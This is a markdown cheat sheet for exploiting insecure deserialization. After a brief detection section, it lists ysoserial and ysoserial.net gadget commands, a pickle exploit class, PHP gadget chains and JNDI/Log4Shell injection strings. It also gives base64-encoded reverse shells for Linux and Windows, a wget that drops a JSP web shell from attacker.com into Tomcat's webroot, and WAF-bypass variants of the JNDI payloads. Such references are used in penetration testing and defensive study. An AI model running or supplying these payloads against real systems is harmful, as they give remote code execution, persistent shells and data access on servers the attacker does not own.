## Java Deserialization — ysoserial & Exploitation Reference

### Detection

Look for:
- `Content-Type: application/x-java-serialized-object`
- Base64 blobs starting with `rO0AB` (raw: `0xACED0005`)
- `.ser` file uploads
- `ObjectInputStream.readObject()` in source
- Java ViewState, JMX, RMI, T3, IIOP endpoints

Hex signature: `AC ED 00 05` in intercepted traffic.

---

### ysoserial Commands

```bash
# Generate payload (replace COMMAND and GADGET)
java -jar ysoserial.jar <GADGET> "COMMAND" > payload.bin
java -jar ysoserial.jar <GADGET> "COMMAND" | base64 > payload.b64

# ---- Apache Commons Collections ----
java -jar ysoserial.jar CommonsCollections1 "id"
java -jar ysoserial.jar CommonsCollections2 "id"
java -jar ysoserial.jar CommonsCollections3 "id"
java -jar ysoserial.jar CommonsCollections4 "id"
java -jar ysoserial.jar CommonsCollections5 "id"
java -jar ysoserial.jar CommonsCollections6 "id"
java -jar ysoserial.jar CommonsCollections7 "id"

# ---- Spring Framework ----
java -jar ysoserial.jar Spring1 "id"
java -jar ysoserial.jar Spring2 "id"

# ---- Groovy ----
java -jar ysoserial.jar Groovy1 "id"

# ---- BeanShell ----
java -jar ysoserial.jar BeanShell1 'Runtime.getRuntime().exec("id")'

# ---- Hibernate ----
java -jar ysoserial.jar Hibernate1 "id"
java -jar ysoserial.jar Hibernate2 "id"

# ---- JBossInterceptors ----
java -jar ysoserial.jar JBossInterceptors1 "id"

# ---- JavassistWeld ----
java -jar ysoserial.jar JavassistWeld1 "id"

# ---- JSON (Jackson, Fastjson) ----
java -jar ysoserial.jar JSON1 "id"

# ---- JRMPClient (connect-back) ----
java -jar ysoserial.jar JRMPClient "attacker-ip:1099"

# ---- JRMPListener (start RMI listener) ----
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "id"

# ---- URLDNS (DNS-only, no RCE, no gadget needed) ----
java -jar ysoserial.jar URLDNS "http://collaborator.example.com"

# ---- MozillaRhino ----
java -jar ysoserial.jar MozillaRhino1 "id"
java -jar ysoserial.jar MozillaRhino2 "id"

# ---- Myfaces ----
java -jar ysoserial.jar Myfaces1 "id"
java -jar ysoserial.jar Myfaces2 "id"

# ---- ROME ----
java -jar ysoserial.jar ROME "id"

# ---- Vaadin ----
java -jar ysoserial.jar Vaadin1 "id"
```

---

### Common Real-World Commands

```bash
# Detection (DNS callback, no RCE gadget needed)
java -jar ysoserial.jar URLDNS "http://BURP-COLLABORATOR-SUBDOMAIN"

# Reverse shell (Linux)
java -jar ysoserial.jar CommonsCollections6 \
  "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDA+JjE=}|{base64,-d}|{bash,-i}"

# Reverse shell (Windows)
java -jar ysoserial.jar CommonsCollections6 \
  "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAQQBUAFQAQQBDAEsARQBSAF8ASQBQACIALABQAE8AUgBUACkA"

# File write
java -jar ysoserial.jar CommonsCollections6 \
  "bash -c {echo,PAYLOAD_BASE64}|{base64,-d}|tee /tmp/shell.jsp"

# Wget
java -jar ysoserial.jar CommonsCollections6 \
  "wget http://attacker.com/shell.jsp -O /var/lib/tomcat/webapps/ROOT/shell.jsp"
```

---

### Delivery Methods

| Protocol     | Tool / Command                                          |
|--------------|---------------------------------------------------------|
| HTTP POST    | `curl -X POST --data-binary @payload.bin http://target` |
| HTTP Cookie  | Base64-encode payload into cookie value                 |
| HTTP Header  | `X-Forwarded-For`, ViewState, custom headers            |
| RMI          | `ysoserial.exploit.RMIRegistryExploit host port gadget` |
| JMX          | `ysoserial.exploit.JMXInvokeMBean`                      |
| T3 (WebLogic)| Use `weblogic_t3.py` or Metasploit module              |
| JNDI/LDAP    | `java -jar JNDI-Injection-Exploit.jar -C "cmd" -A ip`  |

---

### ysoserial.net (for .NET deserialization)

```bash
# BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc" -o raw > payload.bin

# Json.Net
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc"

# SoapFormatter
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -c "calc"

# LosFormatter (ViewState)
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "calc"

# DataContractSerializer
ysoserial.exe -g DataSet -f DataContractSerializer -c "calc"

# Common gadgets: TypeConfuseDelegate, TextFormattingRunProperties,
#   WindowsIdentity, DataSet, ObjectDataProvider, PSObject
```

---

### JNDI Injection (Log4Shell style)

```bash
# Start LDAP server with exploit
java -jar JNDI-Injection-Exploit-1.0.jar -C "id" -A attacker_ip

# Payload strings (inject into logged fields)
${jndi:ldap://attacker_ip:1389/exploit}
${jndi:rmi://attacker_ip:1099/exploit}
${jndi:dns://attacker_ip/exploit}

# Bypass WAF
${${lower:j}ndi:${lower:l}dap://attacker_ip/exploit}
${${upper:j}ndi:${upper:l}dap://attacker_ip/exploit}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker_ip/exploit}
${j${::-n}di:ldap://attacker_ip/exploit}
```

---

### Python Deserialization (pickle)

```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

---

### PHP Deserialization

```php
// Look for: unserialize($_GET['data']) or unserialize(base64_decode(...))
// POP chain depends on application classes

// Generic __destruct / __wakeup gadget
O:8:"ClassName":1:{s:4:"prop";s:6:"system";}

// phpggc — PHP gadget chain generator
// phpggc Laravel/RCE1 system id
// phpggc Symfony/RCE4 exec id
// phpggc Monolog/RCE1 exec id
// phpggc Guzzle/RCE1 exec id
// phpggc Slim/RCE1 exec id
```
